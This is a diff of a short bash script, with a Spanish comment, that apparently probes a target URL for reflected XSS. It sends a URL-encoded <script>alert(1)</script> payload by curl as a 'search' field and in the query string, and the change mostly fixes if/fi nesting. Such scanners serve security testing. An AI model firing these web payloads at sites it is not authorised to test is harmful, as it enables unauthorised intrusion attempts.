@@ -21,6 +21,7 @@ else
       if [[ $search ]]
       then
         curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
+    fi
   else
   # aqui ejecutamos los  dos, checkear si esta search o comment
     if [[ $comment ]]
@@ -31,8 +32,7 @@ else
       ATTACK="$URL$XSS"
       curl -i $ATTACK | grep "200 OK"
       curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
+    fi
       
-   fi 
-arrVar=("?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
-
-curl -i $URLnueva | grep "200"
+  fi
+fi
